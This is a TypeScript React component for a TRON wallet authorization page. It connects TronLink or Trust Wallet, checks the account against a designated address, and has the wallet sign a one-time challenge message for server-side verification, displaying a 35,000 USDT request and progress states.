'use client';

import Image from 'next/image';
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust';
import { useEffect, useMemo, useState } from 'react';

type TronWebLike = {
  defaultAddress?: { base58?: string };
  trx: { signMessageV2: (message: string) => Promise<string> };
};

type TronProvider = {
  isTronLink?: boolean;
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  tronWeb?: TronWebLike | false;
  on?: (event: string, listener: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, listener: (...args: unknown[]) => void) => void;
};

declare global {
  interface Window {
    tron?: TronProvider;
    tronLink?: TronProvider;
    tronWeb?: TronWebLike;
  }
}

type WalletKind = 'tronlink' | 'trust';
type Phase = 'loading' | 'idle' | 'connecting' | 'ready' | 'signing' | 'verifying' | 'success' | 'error';

type Challenge = {
  id: string;
  message: string;
  displayMessage: string;
  expiresAt: number;
};

type ConfigResponse = {
  authorizedWallet: string;
  verified: boolean;
  verifiedAt: number | null;
  networkStatus: string;
  txid: string | null;
  creditedAt: number | null;
  error?: string;
};

type Settlement = {
  networkStatus: string;
  txid: string | null;
  creditedAt: number | null;
};

async function readResponse<T>(response: Response): Promise<T> {
  const data = (await response.json()) as T & { error?: string };
  if (!response.ok) throw new Error(data.error || 'The request could not be completed.');
  return data;
}

function getTronLink() {
  const modernProvider = window.tron;
  const legacyProvider = window.tronLink;
  const provider = modernProvider || legacyProvider;
  const tronWeb = provider?.tronWeb || window.tronWeb;
  return { provider, tronWeb, isLegacy: !modernProvider && Boolean(legacyProvider) };
}

function settlementLabel(status: string) {
  if (status === 'submitted') return 'Submitted to TRON';
  if (status === 'confirmed') return 'Confirmed in block';
  if (status === 'credited') return 'Account credited';
  return 'Pending application validation';
}

export default function WalletVerification() {
  const trustAdapter = useMemo(
    () => new TrustAdapter({ checkTimeout: 2500, openAppWithDeeplink: true, openUrlWhenWalletNotFound: true }),
    [],
  );
  const [authorizedWallet, setAuthorizedWallet] = useState('');
  const [connectedWallet, setConnectedWallet] = useState('');
  const [walletKind, setWalletKind] = useState<WalletKind | null>(null);
  const [challenge, setChallenge] = useState<Challenge | null>(null);
  const [phase, setPhase] = useState<Phase>('loading');
  const [message, setMessage] = useState('Loading secure authorization data...');
  const [verifiedAt, setVerifiedAt] = useState<number | null>(null);
  const [settlement, setSettlement] = useState<Settlement>({
    networkStatus: 'not_started',
    txid: null,
    creditedAt: null,
  });

  useEffect(() => {
    let active = true;
    fetch('/api/config', { cache: 'no-store' })
      .then((response) => readResponse<ConfigResponse>(response))
      .then((config) => {
        if (!active) return;
        setAuthorizedWallet(config.authorizedWallet);
        setSettlement({
          networkStatus: config.networkStatus,
          txid: config.txid,
          creditedAt: config.creditedAt,
        });
        if (config.verified) {
          setPhase('success');
          setVerifiedAt(config.verifiedAt);
          setMessage('Wallet signature verified. Transaction validation is pending.');
        } else {
          setPhase('idle');
          setMessage('Choose a compatible wallet to continue.');
        }
      })
      .catch((error: Error) => {
        if (!active) return;
        setPhase('error');
        setMessage(error.message);
      });

    return () => { active = false; };
  }, []);

  useEffect(() => {
    const resetConnection = () => {
      setConnectedWallet('');
      setChallenge(null);
      setWalletKind(null);
      setPhase('idle');
      setMessage('The active account changed. Choose a wallet to reconnect.');
    };
    const { provider } = getTronLink();
    provider?.on?.('accountsChanged', resetConnection);
    trustAdapter.on('accountsChanged', resetConnection);

    return () => {
      provider?.removeListener?.('accountsChanged', resetConnection);
      trustAdapter.off('accountsChanged', resetConnection);
    };
  }, [trustAdapter]);

  const busy = ['loading', 'connecting', 'signing', 'verifying'].includes(phase);

  async function requestChallenge(address: string) {
    const response = await fetch('/api/challenge', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletAddress: address }),
    });
    const data = await readResponse<Challenge & { alreadyVerified?: boolean; verifiedAt?: number }>(response);

    if (data.alreadyVerified) {
      setPhase('success');
      setVerifiedAt(data.verifiedAt ?? Date.now());
      setSettlement((current) => ({ ...current, networkStatus: 'validation_pending' }));
      setMessage('Wallet signature verified. Transaction validation is pending.');
      return;
    }

    setChallenge(data);
    setPhase('ready');
    setMessage('Connection approved. Review and sign the one-time authorization message.');
  }

  async function connectWallet(kind: WalletKind) {
    if (!authorizedWallet || busy) return;
    setWalletKind(kind);
    setChallenge(null);
    setPhase('connecting');
    setMessage(`Connecting to ${kind === 'trust' ? 'Trust Wallet' : 'TronLink'}...`);

    try {
      let address = '';
      if (kind === 'trust') {
        await trustAdapter.connect();
        address = trustAdapter.address || '';
      } else {
        const wallet = getTronLink();
        if (!wallet.provider) throw new Error('TronLink was not detected. Install it or open this DApp inside TronLink.');
        const accounts = await wallet.provider.request({
          method: wallet.isLegacy ? 'tron_requestAccounts' : 'eth_requestAccounts',
        });
        const refreshedWallet = getTronLink();
        const responseAddress = Array.isArray(accounts) && typeof accounts[0] === 'string' ? accounts[0] : '';
        address = refreshedWallet.tronWeb?.defaultAddress?.base58 || responseAddress;
      }

      if (!address) throw new Error('The wallet did not provide an active TRON account.');
      setConnectedWallet(address);
      if (address !== authorizedWallet) {
        throw new Error('Wallet authorization failed. Review the connected account and try again.');
      }
      await requestChallenge(address);
    } catch (error) {
      setPhase('error');
      setMessage(error instanceof Error ? error.message : 'Unable to connect the selected wallet.');
    }
  }

  async function signChallenge() {
    if (!challenge || !connectedWallet || !walletKind) return;

    try {
      setPhase('signing');
      setMessage(`Approve the message signature in ${walletKind === 'trust' ? 'Trust Wallet' : 'TronLink'}.`);
      let signature = '';

      if (walletKind === 'trust') {
        signature = await trustAdapter.signMessage(challenge.message);
      } else {
        const { tronWeb } = getTronLink();
        if (!tronWeb) throw new Error('The TronLink connection is no longer available.');
        signature = await tronWeb.trx.signMessageV2(challenge.message);
      }

      setPhase('verifying');
      setMessage('Verifying the recovered signer on the server...');
      const response = await fetch('/api/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          challengeId: challenge.id,
          walletAddress: connectedWallet,
          signature,
        }),
      });
      const result = await readResponse<{
        verified: boolean;
        verifiedAt: number;
        networkStatus: string;
        txid: string | null;
      }>(response);

      setPhase('success');
      setVerifiedAt(result.verifiedAt);
      setSettlement({ networkStatus: result.networkStatus, txid: result.txid, creditedAt: null });
      setMessage('Wallet signature verified. Transaction validation is pending.');
      setChallenge(null);
    } catch (error) {
      setPhase('ready');
      setMessage(error instanceof Error ? error.message : 'The signature was declined or could not be verified.');
    }
  }

  if (phase === 'success') {
    return (
      <div className="authorization-grid success-grid">
        <section className="summary-panel">
          <span className="section-label">AUTHORIZATION RECEIVED</span>
          <h2>Signature verified.</h2>
          <p className="section-copy">
            The wallet proof passed server-side verification. Network submission remains locked until the main application validates the request.
          </p>

          <div className="result-meta">
            <div><span>Verification</span><strong>Completed</strong></div>
            <div><span>Network status</span><strong>{settlementLabel(settlement.networkStatus)}</strong></div>
            <div><span>Account credit</span><strong>{settlement.creditedAt ? 'Completed' : 'Waiting for confirmation'}</strong></div>
          </div>
        </section>

        <section className="progress-panel" aria-label="Transaction progress">
          <div className="progress-row complete"><span>1</span><div><strong>Wallet signature</strong><small>Cryptographically verified</small></div></div>
          <div className="progress-row active"><span>2</span><div><strong>Transaction validation</strong><small>Pending main application validation</small></div></div>
          <div className="progress-row"><span>3</span><div><strong>First-block confirmation</strong><small>Waiting for network submission</small></div></div>

          <div className="txid-field">
            <span>TXID</span>
            <strong>{settlement.txid || 'Displayed after first-block confirmation'}</strong>
          </div>
          <p className="truth-note">No network transaction or balance credit is claimed until a real TXID is returned and confirmed.</p>
          {verifiedAt && <time>Verified {new Date(verifiedAt).toLocaleString('en-US')}</time>}
        </section>
      </div>
    );
  }

  return (
    <div className="authorization-grid">
      <section className="summary-panel">
        <div className="summary-heading">
          <span className="section-label">TRANSACTION REQUEST</span>
          <span className="pending-badge"><i /> Awaiting authorization</span>
        </div>
        <h2>Review authorization</h2>
        <p className="section-copy">Confirm the request details before connecting the designated wallet.</p>

        <dl className="request-details">
          <div><dt>Network</dt><dd><span className="network-icon">T</span> TRON Mainnet</dd></div>
          <div><dt>Asset</dt><dd>USDT <small>TRC20</small></dd></div>
          <div><dt>Amount</dt><dd className="amount">35,000 <small>USDT</small></dd></div>
          <div><dt>Receiver vault</dt><dd className="mono">TEq6bX...WqLA3Cy</dd></div>
          <div><dt>Reference</dt><dd className="mono">AUTH-35000-TRC20</dd></div>
        </dl>
      </section>

      <section className="wallet-panel">
        <span className="section-label">AUTHORIZED WALLET</span>
        <h2>Connect to continue</h2>
        <p className="section-copy">Select the wallet that holds the designated TRON account.</p>

        <div className="wallet-options">
          <button
            type="button"
            className={`wallet-option ${walletKind === 'tronlink' ? 'selected' : ''}`}
            onClick={() => connectWallet('tronlink')}
            disabled={busy}
          >
            <Image src="/tron-logo.png" width={34} height={34} alt="" />
            <span><strong>TronLink</strong><small>Extension or in-app browser</small></span>
            <b>Connect</b>
          </button>
          <button
            type="button"
            className={`wallet-option trust-option ${walletKind === 'trust' ? 'selected' : ''}`}
            onClick={() => connectWallet('trust')}
            disabled={busy}
          >
            <Image src={trustAdapter.icon} width={31} height={35} alt="" unoptimized />
            <span><strong>Trust Wallet</strong><small>Extension or mobile DApp</small></span>
            <b>Connect</b>
          </button>
        </div>

        <div className={`status-message status-${phase}`} role="status" aria-live="polite">
          <span className="status-mark">{phase === 'error' ? '!' : phase === 'ready' ? '✓' : '•'}</span>
          {message}
        </div>

        {challenge && phase === 'ready' && (
          <div className="signing-box">
            <details>
              <summary>Review one-time message</summary>
              <pre>{challenge.displayMessage}</pre>
            </details>
            <button className="sign-button" type="button" onClick={signChallenge}>
              Sign authorization message <span>→</span>
            </button>
            <small>Expires at {new Date(challenge.expiresAt).toLocaleTimeString('en-US')}</small>
          </div>
        )}

        <div className="security-note">
          <span>◆</span>
          <p><strong>Message signature only.</strong> This step does not expose your private key and does not by itself broadcast a transaction.</p>
        </div>
      </section>
    </div>
  );
}
